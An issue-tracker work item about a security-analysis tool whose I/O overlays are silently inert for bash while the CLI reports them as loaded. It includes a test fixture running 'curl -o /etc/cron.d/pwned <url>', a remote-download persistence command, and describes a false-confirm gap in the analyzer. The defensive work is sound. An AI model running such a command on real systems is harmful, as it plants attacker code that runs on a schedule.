    kind: work_item  # 9820
    title: "A project-local io_primitives overlay is silently inert for a language with no shipped catalogue: load_catalog returns before the overlay loop, under a 'loaded N overlay(s)' banner"  # 9820
    status: todo_hard  # 9820
    priority: 2  # 9820
    parent:  # 9820
    tags:  # 9820
    - io_boundary  # 9820
    - io_primitives  # 9820
    isbefore: []  # 9820
    duplicate_of: []  # 9820
    not_duplicate_of: []  # 9820
    pr_ref:  # 9820
    description: "## What is broken\n\n`load_catalog` returns early for a language with no shipped catalogue file:\n\n    io_boundary.py:1218-1222\n        if not path.exists():\n            # INV-javam: no catalog file (and no alias resolving to one)\n            return IoBoundaryCatalog(language=language, is_supported=False)\n\nThe overlay loop that applies `--io-primitives` / claims-file\n`extra_catalogs.io_primitives` sits BELOW it, at 1233-1244. So a project-local\noverlay is never applied to a language that ships no catalogue — the function\nhas already returned.\n\nThe user is told the opposite. The CLI prints the disclosure banner first,\nbecause `_disclose_io_overlays` runs before the per-language load:\n\n    Loaded 1 project-local I/O primitive overlay(s): ov-single.yaml. Overlay\n    entries override built-in catalog entries on qualified-name match; later\n    paths override earlier ones.\n\nand then reports, in the same run, that the language has no catalogue at all.\n\n## Measured, shipped CLI\n\nFixture: two-line bash script whose only external command is\n`curl -o /etc/cron.d/pwned <url>`. Overlay `ov-single.yaml`:\n\n    language: bash\n    status: overlay\n    net_send:\n      - module: curl\n        functions: [curl]\n\n    hypergumbo verify-claims fx --claims claims-netsend.yaml \\\n        --io-primitives ov-single.yaml\n\n    -> banner: \"Loaded 1 project-local I/O primitive overlay(s)\"\n    -> verdict: inconclusive rc 2\n    -> reason: \"language(s) bash made calls but have no I/O catalog, so none of\n                their I/O could be classified\"\n\nControl, same session: the IDENTICAL rows placed in\n`io_primitives/bash.yaml` (the shipped path) DO take effect — net_send goes\n`violated` rc 1. So the rows are well-formed and the analyzer is not blind; the\noverlay door is simply shut for this language.\n\n## Why it matters beyond bash\n\nADR-0016 §27 scopes the built-in catalogue to the stdlib on purpose and assigns\neverything else to user-supplied overlays; the standing owner ruling is the\nsame (\"io_primitives stays STDLIB-SCOPED; third-party is USER-SUPPLIED via\noverlays\"). For a language with no shipped catalogue that remedy does not\nexist — the user cannot close the gap themselves by any documented means. bash\nis exactly that case, and it is the language the coverage gate names on 6 of 6\ncohort repos.\n\n## Direction of the failure\n\nIt fails CLOSED (the verdict stays `inconclusive`), so this is not a false\nconfirm and not a P1. The defect is that it is SILENT: a positive \"loaded\"\nbanner over a no-op, which is the same shape as the `if catalog.primitives:`\nlandmine that hid INV-dabov at three layers.\n\n## Hard prerequisite\n\nDo NOT open this door before the producer-stamped-opacity gate lands. Measured\nin the same session: a single-boundary `curl -> net_send` catalogue makes a\n`fs_write must_not_exist` claim return `confirmed` rc 0 for a script writing\ninto /etc/cron.d. Making overlays work for uncatalogued languages hands that\nsame false confirm to any user who writes the obvious overlay. Gate first.\n\n## Candidate dispositions\n\n1. Move the overlay loop above the early return, so overlays apply to a\n   synthesized empty catalogue for the language. Note `is_supported` then needs\n   deciding on its own terms — an overlay-only catalogue is \"supported\" for\n   classification but has no stdlib provenance and must not read as one.\n2. Keep the door shut and make it HONEST: warn when an overlay declares a\n   language that resolved to no catalogue, so the no-op is visible.\n\n(2) is strictly smaller and is the honest-disclosure move; (1) is the one that\nactually delivers the ADR-0016 §27 remedy. They are not exclusive — (2) is\ncorrect even if (1) never happens."  # 9820
    fields: {}  # 9820
